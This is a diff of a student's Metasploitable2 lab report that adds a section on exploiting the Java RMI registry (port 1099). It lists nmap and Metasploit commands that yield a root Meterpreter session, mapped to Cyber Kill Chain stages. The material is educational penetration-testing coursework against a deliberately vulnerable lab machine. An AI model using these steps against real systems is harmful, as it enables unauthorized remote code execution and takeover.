@@ -1,4 +1,4 @@
-# Metasploitable2 Exploitation Report
+<img width="640" height="438" alt="exploit9" src="https://github.com/user-attachments/assets/cb3611c5-584d-48b1-ac14-625ffbf87bca" /># Metasploitable2 Exploitation Report
 
 **Name:** Emmanuel Gregory Opoku Owusu-Afriyie
 **Index Number:** 4195524
@@ -194,3 +194,27 @@ Key open ports found:
 - **Outcome / Impact:** Obtained instant, unauthenticated root shell access on the target via a pre-existing backdoor.
 
   
+## Exploit 9: Java RMI Server Insecure Default Configuration
+
+- **Service / Port:** Java RMI / 1099
+- **Vulnerability:** Java RMI Registry Insecure Default Configuration — the registry accepts remote class loading, allowing arbitrary code execution
+- **Tool Used:** Metasploit — exploit/multi/misc/java_rmi_server
+- **Why This Tool:** Exploiting this requires crafting a valid RMI call that tricks the registry into loading and executing a remote Java class — a low-level protocol interaction Metasploit automates reliably via a purpose-built module.
+- **Steps:**
+  1. `nmap -p 1099 -sV 192.168.1.3` — confirmed GNU Classpath grmiregistry
+  2. `msfconsole` → `search java_rmi`
+  3. `use 1` (exploit/multi/misc/java_rmi_server)
+  4. `set RHOSTS 192.168.1.3`
+  5. `set LHOST 192.168.1.4`
+  6. `exploit`
+  7. `getuid` / `sysinfo` to confirm access
+- **Evidence:** evidence/exploit9.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - Reconnaissance: nmap identified the Java RMI registry open on port 1099.
+  - Weaponization: selecting the module and configuring RHOSTS/LHOST paired the vulnerability with a working malicious class payload.
+  - Delivery/Exploitation: the RMI call sent to the target caused it to load and execute the attacker-supplied class.
+  - Installation/C2: a Meterpreter session was opened, giving remote control of the target.
+  - Actions on Objectives: ran `getuid`/`sysinfo`, confirming root-level access and gathering system details.
+- **Outcome / Impact:** Obtained a root-level Meterpreter session on the target via insecure Java RMI registry configuration.
+
+
